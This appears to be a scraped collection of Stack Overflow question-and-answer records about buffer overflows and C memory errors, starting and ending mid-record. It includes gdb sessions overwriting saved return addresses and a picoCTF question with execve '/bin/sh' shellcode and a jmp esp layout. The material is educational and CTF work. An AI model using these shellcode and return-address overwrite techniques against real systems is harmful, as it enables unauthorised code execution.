0xf7c20af9\n0xffffd3b0: 0x00000000  0x00000000  0x080482e7  0xf7c20af9\n0xffffd3c0: 0x00000002  0xffffd474  0xffffd480  0xffffd3e0\n0xffffd3d0: 0xf7e1fe2c  0x0804907d  0x00000002  0xffffd474\n\nI'm compiling with the following flags\ngcc -o example2 -fno-stack-protector -no-pie -m32 -g -z execstack example2.c -w\n\nThe whole interaction on gdb\n(gdb) disassemble main\nDump of assembler code for function main:\n   0x080497d5 <+0>: lea    0x4(%esp),%ecx\n   0x080497d9 <+4>: and    $0xfffffff0,%esp\n   0x080497dc <+7>: push   -0x4(%ecx)\n   0x080497df <+10>:    push   %ebp\n   0x080497e0 <+11>:    mov    %esp,%ebp\n   0x080497e2 <+13>:    push   %ebx\n   0x080497e3 <+14>:    push   %ecx\n   0x080497e4 <+15>:    sub    $0x10,%esp\n   0x080497e7 <+18>:    call   0x804981c <__x86.get_pc_thunk.ax>\n   0x080497ec <+23>:    add    $0x9a808,%eax\n   0x080497f1 <+28>:    mov    %ecx,%edx\n   0x080497f3 <+30>:    mov    0x4(%edx),%edx\n   0x080497f6 <+33>:    add    $0x4,%edx\n   0x080497f9 <+36>:    mov    (%edx),%edx\n   0x080497fb <+38>:    sub    $0x8,%esp\n   0x080497fe <+41>:    push   %edx\n   0x080497ff <+42>:    lea    -0x12(%ebp),%edx\n   0x08049802 <+45>:    push   %edx\n   0x08049803 <+46>:    mov    %eax,%ebx\n   0x08049805 <+48>:    call   0x8049020\n   0x0804980a <+53>:    add    $0x10,%esp\n   0x0804980d <+56>:    mov    $0x0,%eax\n--Type <RET> for more, q to quit, c to continue without paging--\n   0x08049812 <+61>:    lea    -0x8(%ebp),%esp\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\nEnd of assembler dump.\n(gdb) break *0x08049805\nBreakpoint 1 at 0x8049805: file example.c, line 6.\n(gdb) break *0x08049812\nBreakpoint 2 at 0x8049812: file example.c, line 9.\n(gdb) run AAAAAAAAAAAAAAAAAAAAAAAAA\nStarting program: /home/r3/buffer-overflows/bo in memory example/example AAAAAAAAAAAAAAAAAAAAAAAAA\n\nThis GDB supports auto-downloading debuginfo from the following URLs:\n  <https://debuginfod.archlinux.org>\nEnable debuginfod for this session? (y or [n]) \nDebuginfod has been disabled.\nTo make this setting permanent, add 'set debuginfod enabled off' to .gdbinit.\n\nBreakpoint 1, 0x08049805 in main (argc=2, argv=0xffffd464) at example.c:6\n6       strcpy(buffer, argv[1]);\n(gdb) info reg\neax            0x80e3ff4           135151604\necx            0xffffd330          -11472\nedx            0xffffd306          -11514\nebx            0x80e3ff4           135151604\nesp            0xffffd2f0          0xffffd2f0\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049805           0x8049805 <main+48>\neflags         0x292               [ AF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd2f0: 0xffffd306  0xffffd6a4  0x00000000  0x080497ec\n0xffffd300: 0x080ade17  0x080e7c04  0x08049030  0x080ae037\n0xffffd310: 0xffffd330  0x080e3ff4  0xffffd428  0x08049ceb\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n(gdb) c\nContinuing.\n\nBreakpoint 2, main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0xffffd6b0          -10576\nedx            0xffffd312          -11502\nebx            0x80e3ff4           135151604\nesp            0xffffd300          0xffffd300\nebp            0xffffd318          0xffffd318\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x8049812           0x8049812 <main+61>\neflags         0x286               [ PF SF IF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0xffffd300: 0x080ade17  0x41417c04  0x41414141  0x41414141\n0xffffd310: 0x41414141  0x41414141  0x41414141  0x00414141\n0xffffd320: 0x00000021  0xffffd338  0x00067e1c  0x08049ceb\n0xffffd330: 0x00000002  0xffffd464  0xffffd470  0xffffd354\n0xffffd340: 0x080e3ff4  0x0804968d  0x00000002  0xffffd464\n(gdb) c\nContinuing.\n\nProgram received signal SIGSEGV, Segmentation fault.\n0x0804981b in main (\n    argc=<error reading variable: Cannot access memory at address 0x41414141>, \n    argv=<error reading variable: Cannot access memory at address 0x41414145>)\n    at example.c:9\n9   }\n(gdb) info reg\neax            0x0                 0\necx            0x41414141          1094795585\nedx            0xffffd312          -11502\nebx            0x41414141          1094795585\nesp            0x4141413d          0x4141413d\nebp            0x41414141          0x41414141\nesi            0x80e3ff4           135151604\nedi            0x1                 1\neip            0x804981b           0x804981b <main+70>\neflags         0x10286             [ PF SF IF RF ]\ncs             0x23                35\nss             0x2b                43\nds             0x2b                43\nes             0x2b                43\nfs             0x0                 0\ngs             0x63                99\n(gdb) x/20x $esp\n0x4141413d: Cannot access memory at address 0x4141413d\n(gdb) c\nContinuing.\n\nProgram terminated with signal SIGSEGV, Segmentation fault.\nThe program no longer exists.\n\n",
        "Answer": "This code\n   0x08049815 <+64>:    pop    %ecx\n   0x08049816 <+65>:    pop    %ebx\n   0x08049817 <+66>:    pop    %ebp\n   0x08049818 <+67>:    lea    -0x4(%ecx),%esp\n   0x0804981b <+70>:    ret\n\nrestores registers from their saved location on stack. However, you've overwritten the stack contents, so all the registers are now set to 0x4141... values. And that causes the lea    -0x4(%ecx),%esp instruction to SIGSEGV, since ECX points to inaccessible memory.\nAs ssbssa commented, this is happening due to stack realignment (which itself is needed to deal with 64-bit aligned (newer) AVX etc.).\nIf I turn stack realignment off with -mpreferred-stack-boundary=2, the code becomes:\n   0x08049176 <+0>:     push   %ebp\n   0x08049177 <+1>:     mov    %esp,%ebp\n   0x08049179 <+3>:     sub    $0xc,%esp\n   0x0804917c <+6>:     mov    0xc(%ebp),%eax\n   0x0804917f <+9>:     add    $0x4,%eax\n   0x08049182 <+12>:    mov    (%eax),%eax\n   0x08049184 <+14>:    push   %eax\n   0x08049185 <+15>:    lea    -0xa(%ebp),%eax\n   0x08049188 <+18>:    push   %eax\n   0x08049189 <+19>:    call   0x8049050 <strcpy@plt>\n   0x0804918e <+24>:    add    $0x8,%esp\n   0x08049191 <+27>:    mov    $0x0,%eax\n   0x08049196 <+32>:    leave\n   0x08049197 <+33>:    ret\n\nand the RIP overwrite works:\nProgram received signal SIGSEGV, Segmentation fault.\n0x41414141 in ?? ()\n(gdb) x/i $pc\n=> 0x41414141:  Cannot access memory at address 0x41414141\n\n",
        "Source": "https://stackoverflow.com/questions/78053915/eip-doesnt-get-overwritten-when-perfoming-a-buffer-overflow-attack"
    },
    {
        "Title": "Buffer Overflow: Why does buffer assignment impact other variables?",
        "Question": "\nvoid foo() {\n    int value = 0;\n    char buf[4];\n    buf[4] = 1;\n\n\n    printf(\"value: %d\\n\", value);\n}\n\nint main() {\n    foo();\n    return 0;\n}\n\n\n\nWhy does 'value' print 1?\nI believe this has to do with buffer overflow and little endian but I am finding it hard to grasp.\n",
        "Answer": "Because it is Undefined Behaviour.\nIt is enough to change the optimization options and you will get different results.\nGodbolt for example:\n\nWith -O0 : 1\nWith -Os : 0\n\nBut it does not have to be like this. It can end up in the segfault or something else may happen.\nhttps://godbolt.org/z/TEbWbMvsa\n\nI understand it's undefined behavior. I was just wondering how this is\nrelated to little endian. When I went past buf[3] into buf[4], it\nstarted changing the next byte in memory. How do I know the next byte\nin memory is 'value'?\n\nYou cant know it. Order is not specified. value can be optimized out and not stored on the stack at all. You need to know your ABI and compiler very well to predict it.\nIn your case:\n+ 0x07: value byte 4  MSB\n+ 0x06: value byte 3\n+ 0x05: value byte 2\n+ 0x04: value byte 1  LSB\n+ 0x03: buf[3]\n+ 0x02: buf[2]\n+ 0x01: buf[1]\n+ 0x00: buf[0]\n\n",
        "Source": "https://stackoverflow.com/questions/77937810/buffer-overflow-why-does-buffer-assignment-impact-other-variables"
    },
    {
        "Title": "ROP - The use of the jmp esp",
        "Question": "I was playing some picoCTF challenges today and I found myself stuck in a challenge.\nDigging around the internet, I found a solution online which I cannot fully grasp.\nThe challenge (whose name I won't spoil for those who are playing picoCTF) revolves around a vulnerable x86 ELF, and it involves using ROP gadgets to gain a shell, however the checksec reveals that the binary is not PIE, and there is no NX enabled.\nBy breaking at ret of the vulnerable function, I noticed that the EAX register contains the start address of the buffer on the stack. Moreover, I found out that the offset between the start of the buffer and the saved EIP is 28 bytes.\nSo my first guess was to craft a sufficiently short shellcode, place it inside the buffer preceeded by a NOP sled, and overwrite the saved EIP with a gadget jumping to the content of the EAX register, aka the start of my buffer.\nHowever, I found out that this approach is not working.\nThe shellcode I crafted is:\nint 0x3   ; used for debugging purposes\nxor eax, eax\npush eax\npush 0x0068732f\npush 0x6e69622f\nxor ebx, ebx\npush eax\npush ebx\nmov ecx, esp\nmov al, 0xb\nint 0x80\n\nI assembled it using pwntool's asm library, setting the architecture to i386.\nThe debugger reveals the following after few steps in:\npwndbg> \n\nProgram received signal SIGSEGV, Segmentation fault.\n0xff854a01 in ?? ()\nLEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ REGISTERS / show-flags off / show-compact-regs off ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n EAX  0x0\n EBX  0x0\n ECX  0x80e5300 (_IO_2_1_stdin_) \u25c2\u2014 0xfbad2088\n EDX  0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EDI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n ESI  0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n EBP  0x90909090\n ESP  0xff854a00 \u25c2\u2014 0x0\n EIP  0xff854a01 \u25c2\u2014 0x2f000000\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ DISASM / i386 / set emulate on ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n   0xff8549f3    push   eax\n   0xff8549f4    push   0x68732f\n   0xff8549f9    push   0x6e69622f\n   0xff8549fe    xor    ebx, ebx\n   0xff854a00    add    byte ptr [eax], al\n    \u2193\n \u25ba 0xff854a01    add    byte ptr [eax], al\n   0xff854a03    add    byte ptr [edi], ch\n   0xff854a05    bound  ebp, qword ptr [ecx + 0x6e]\n   0xff854a08    das    \n   0xff854a09    jae    0xff854a73                    <0xff854a73>\n    \u2193\n   0xff854a73    add    byte ptr [eax], al\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ STACK ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n00:0000\u2502 esp eip-1 0xff854a00 \u25c2\u2014 0x0\n01:0004\u2502           0xff854a04 \u25c2\u2014 '/bin/sh'\n02:0008\u2502           0xff854a08 \u25c2\u2014 0x68732f /* '/sh' */\n03:000c\u2502           0xff854a0c \u25c2\u2014 0x0\n04:0010\u2502 edx       0xff854a10 \u2014\u25b8 0x80e5000 (_GLOBAL_OFFSET_TABLE_) \u25c2\u2014 0x0\n... \u2193              2 skipped\n07:001c\u2502           0xff854a1c \u25c2\u2014 0x3e8\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500[ BACKTRACE ]\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\n \u25ba f 0 0xff854a01\n\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\npwndbg> \n\nMeaning that the execution is breaking at 0xff854a00.\nNow the solution I found online involved crafting the overflow string in the following way:\n\nWrite 6 NOPs.\nPlace the assembled instruction for jmp esp\nWrite 20 more NOPs.\nPlace the jmp eax gadget to jump to the start of the buffer, overwriting the saved EIP.\nAppend the shellcode.\n\nFrom what I've understood, the jmp ESP instruction allows to direct the execution right after the ret instruction, thus jumping inside the shellcode, but I would like to know more about this.\nI even tried recalling the x86 Call/Return Protocol, but it seems that I cannot fully grasp how jumping to the stack would actually resolve the challenge.\nI seek your help.\nThanks!\n",
        "Answer": "Your code is on the stack under the stack pointer. Part of it is overwritten by your own push instructions. Notice that bound ebp, qword ptr [ecx + 0x6e] has machine code 62 69 6E which corresponds to push 0x6e69622f. Adjusting esp downwards by a suitable amount should fix the problem, e.g. sub esp, 32\nThe other solution works around the problem by putting most of the shellcode above the stack pointer and only using a single jmp esp to transfer control. Here is an illustration of the memory layout:\n|    ...      |           |     ^       |\n|    ...      |           |     |       |\n|    ...      |           |     |       |\n|    ...      | <= ESP => |  shellcode  |\n+-------------+           +-------------+\n|  ret addr   |  jmp eax  |  ret addr   |\n+-------------+           +-------------+\n| pushed data |           | pushed data |\n|     |       |           |     |       |\n|     |       |           |     |       |\n|     v       |           |     v       |\n|  !overlap!  |           |    ...      |\n|     ^       |           |   jmp esp   |\n|     |       |           |    nop      |\n|     |       |           |    nop      |\n|  shellcode  | <= EAX => |    nop      |\n+-------------+           +-------------+\n\nThe initial nops are probably not needed, it should work fine with the jmp esp followed by 26 nops (or whatever padding since it's not going to be executed) instead.\n",
        "Source": "https://stackoverflow.com/questions/77832621/rop-the-use-of-the-jmp-esp"
    },
    {
        "Title": "why is my malloc(1) segfaulting my program?",
        "Question": "I have a problem in my C program that makes it so that it segfaults on malloc(1). I've spent many hours trying to find out why it segfaults but\nI just can't figure it out. This portion of my program separates strings using identifiers. Example, string=\"12wo4ne53wone86wo99w5ne\"; identifiers, start=\"wo\", end=\"ne\"; would return {\"wo4ne\", \"wone\", \"wo99w5ne\"}.\nMy code is as follows.\n// basically like substring() in java\nchar* stringAt(char* str, int start, int end) {\n    int length = end - start + 1;\n    int temp = start;\n    char* savedChar = NULL;\n    savedChar = malloc(length + 1);\n    for(int x = 0; x < length; x++) {\n        savedChar[x] = str[temp];\n        temp++;\n    }\n    savedChar[length] = '\\0';\n    return savedChar;\n}\n\n// finds \"identifier\" in string after certain position in that string\nint findIdentifier(char* str, char* identifier, int pos, int isEnd) {\n\n    // checks first character with first character in \"identifier\"\n    for(int x = pos; x < strlen(str) - 1; x++) {\n        if(str[x] == identifier[0]) {\n\n            // if first characters match then check rest\n            for(int i = 0; i < strlen(identifier); i++) {\n                if(str[x + i] != identifier[i]) {\n                    i = strlen(identifier);\n                }\n                if(i == strlen(identifier) - 1) {\n\n                    // isEnd checks if you should count the last position of the identifier...\n                    // -like ident=\"1234\" then \"end\" is the position of \"4\".\n                    // -not end be the position of \"1\"\n                    if(isEnd == 1) {\n                        return x + strlen(identifier) - 1;\n                    }\n                    return x;\n                }\n            }\n        }\n    }\n    return -1;\n}\n\nchar** separateStrings(char* str, char* identifier, char* lastIdentifier) {\n    char** savedStr = NULL;\n\n    // segfault here!\n    savedStr = malloc(1);\n    // segfualt here!\n\n    int start = -2;\n    int end = 0;\n    int x = 0;\n    do {\n\n    // first run check/gets first and last positions of the identifier in the string\n    if(start == -2) {\n        start = findIdentifier(str, identifier, 0, 0);\n    } else {\n    start = findIdentifier(str, identifier, end + 1, 0);\n    }\n    end = findIdentifier(str, lastIdentifier, start + 1, 1);\n    \n    if(start != -1) {\n        if(end == -1) {\n            end = strlen(str);\n        }\n        char* newStr = stringAt(str, start, end);\n\n        // dynamically increase the size of savedStr (x is iterated every run through here)\n        realloc(savedStr, x + 1);\n        savedStr[x] = malloc(strlen(newStr) + 1);\n        strcpy(savedStr[x], newStr);\n        x++;\n    }\n\n    } while(start != -1 && end != -1);\n    return savedStr;\n}\n\nI have tried looking up why this could not be working and the only thing I can think of is a Buffer Overflow. So I then tried to run findIdentifier() many times but that works fine.\nThe program is also inconsistent and sometimes runs farther into the code than others but is accurate with its outcomes.\n",
        "Answer": "If savedStr is supposed to be a dynamically allocated array of strings, then allocating 1 byte of memory is not sufficient to store a pointer to a char (depending on your platform, this requires either 4 or 8 bytes).\nEven when you realloc it to be larger, you're only adding 1 byte at a time. This when you reference and assign with savedStr[x] = malloc(strlen(newStr) + 1); you're invoking undefined behavior, which in this case it would seem has manifested as a segmentation fault.\nYou almost certainly want to allocate:\nsavedStr = malloc(sizeof(char *));\n\nAnd then when you re-allocate:\nrealloc(savedStr, (x + 1) * sizeof(char *));\n\nBut you also want to capture the pointer realloc returns. If you're not too worried about allocation error checking:\nsavedStr = realloc(savedStr, (x + 1) * sizeof(char *));\n\nBreaking out the dynamically resized string vector problem\nOne of the core problems your code solves is having an array that grows dynamically. If you break this bit of code out, then you can approach the remainder of your program without worrying about the memory management.\nThe size of the array doubles when needed rather than growing by a single entry to minimize allocations. There may be more ideal growth factors for efficiency.\n#include <string.h>\n#include <stdlib.h>\n#include <stdio.h>\n\nstruct string_vec {\n    char **data;\n    size_t cap;\n    size_t sz;\n};\n\nstruct string_vec *string_vec_new(size_t cap) {\n    struct string_vec *vec = malloc(sizeof(struct string_vec));\n    if (!vec) return NULL;\n\n    *vec = (struct string_vec){\n        .data = malloc(sizeof(char *) * cap),\n        .cap = cap,\n        .sz = 0\n    };\n\n    return vec;\n}\n\nstruct string_vec *string_vec_add(\n    struct string_vec *vec,\n    const char *str\n) {\n    if (vec->sz < vec->cap) {\n        vec->data[vec->sz++] = strdup(str);\n        return vec;\n    }\n\n    char **new_data = realloc(vec->data, sizeof(char *) * vec->cap * 2);\n    if (!new_data) return NULL;\n\n    vec->data = new_data;\n    vec->cap *= 2;\n    vec->data[vec->sz++] = strdup(str);\n\n    return vec;\n}\n\nvoid string_vec_del(struct string_vec *vec) {\n    for (size_t i = 0; i < vec->sz; i++) {\n        free(vec->data[i]);\n    }\n\n    free(vec->data);\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77724594/why-is-my-malloc1-segfaulting-my-program"
    },
    {
        "Title": "How to properly memcpy without overflow issues",
        "Question": "In a legacy code I am getting buffer overflow errors in fortify audit.\nLet me explain the issue here:\nI have a function, say foo(size_t len, unsigned char **buf)  ,in this foo I am memcopying a string variable in buf as follows.\nchar temp[256];\n\nsprintf(temp, \"abcd%s\",somefunct_string.c_str()); //so the string temp is variable length\n\nmemcpy(*buf, temp, temp.length()); \n\nin practical, the temp.length() is always < len (which is buf alloted size). But fortify would give potential risk here.\nhow do i resolve this?\n",
        "Answer": "Try calling the std::string::data() function to access the string via a pointer to the string.\nmemcpy(*buf, somefunct_string.data(), somefunct_string.size());\n\nAlso, memcpy_s() is available since C11.\nmemcpy_s(*buf, temp.length(), somefunct_string.data(), somefunct_string.size())\n\nmemcpy() and memcpy_s() are called when copying a sequence from one array to another array.  If the copy overlaps within the same array, memmove() or memmove_s() should be called.\n",
        "Source": "https://stackoverflow.com/questions/77593393/how-to-properly-memcpy-without-overflow-issues"
    },
    {
        "Title": "Why getting &quot;segmentation fault&quot; when sending 127 characters to a buffer with capacity of 128",
        "Question": "I have the following code taken from a binary exploitation exercises:\n#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n#include <unistd.h>\n\n#define BANNER \\\n  \"Welcome to \" LEVELNAME \", brought to you by https://exploit.education\"\n\nchar *gets(char *);\n\nvoid start_level() {\n  char buffer[128];\n  gets(buffer);\n}\n\nint main(int argc, char **argv) {\n  printf(\"%s\\n\", BANNER);\n  start_level();\n}\n\nMy question is regarding the way the buffer stores the information.\nOur buffer has storage for 128 characters.\nWhen I send 127 characters I am getting segmentation fault:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*127)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nSegmentation fault\n\n\nBut if I send 126 characters, there is not error:\nuser@phoenix-amd64:/opt/phoenix/amd64$ python -c 'print(\"A\"*126)'  | ./stack-five \nWelcome to phoenix/stack-five, brought to you by https://exploit.education\nuser@phoenix-amd64:\n\nIf the buffer has capacity of 128, and I sent it 127 characters, why it failed? It should have at least one more place no?\nOne thing I though is maybe after sending 127 characters, it adds the NULL terminator (\\x00) but even if that happens, we have exactly 128 characters, so why it crash?\n",
        "Answer": "You have a buffer overflow between the '\\n' that Python print() adds and the '\\0' you need for the string that c adds:\n[python3 -c 'print(\"A\"*126)' | wc -c\n127\n\nI would fix that in Python with:\npython3 -c \"print('A'*126, end='')\" | wc -c\n126\n\ngets() is unsafe so use fgets() instead.\n",
        "Source": "https://stackoverflow.com/questions/77504824/why-getting-segmentation-fault-when-sending-127-characters-to-a-buffer-with-ca"
    },
    {
        "Title": "C problem about Compiler and Memory Theory",
        "Question": "Without calling any \"call\" or \"jump\" function, we need to get a output in order of \"this is the first\" then \"this is the second.\". In my opinion we need to use \"bold\" with the use of Memory and instructions. Also we cannot call the function of \"study\".\n#include <stdio.h>\n\nvoid study()\n{\n    printf(\"this is the second.\\n\");\n}\n\nvoid study2()\n{\n    int bold[4];\n    // can only modify this section BEGIN\n    // cant call study(), maybe use study(pointer to function)\n\n\n    // can only modify this section END\n    printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[])\n{\n    study2();\n    return 0;\n}\n\n",
        "Answer": "Perhaps not what OP had in mind, yet macros do the trick.\n#include <stdio.h>\n\nvoid study() {\n  printf(\"this is the second.\\n\");\n}\n\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  // Without calling any \"call\" or \"jump\" function, \n  #define F1 study\n  #define F2 study2\n  #define study2() F2(); F1();\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\nint main(int argc, char *argv[]) {\n  study2();\n  return 0;\n}\n\nOutput\nthis is the first\nthis is the second.\n\n\nMaybe violates <Also we cannot call the function of \"study\".>.  Depends on \"we\", if \"we\" is the portion of code between BEGIN ... END, it is OK.\nElse if \"we\" is anywhere in code, than maybe a direct approach:\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  #define printf(x) printf(\"this is the first\\nthis is the second.\\n\")\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n\n@Peter Cordes suggests a 3rd way, where our modification does not call study().\nvoid study2() {\n  int bold[4];\n  // can only modify this section BEGIN\n  atexit(study);\n  // can only modify this section END\n  printf(\"this is the first\\n\");\n}\n\n",
        "Source": "https://stackoverflow.com/questions/77399108/c-problem-about-compiler-and-memory-theory"
    },
    {
        "Title": "&#39;malloc(): corrupted top size&#39; After allocating more than 200K int",
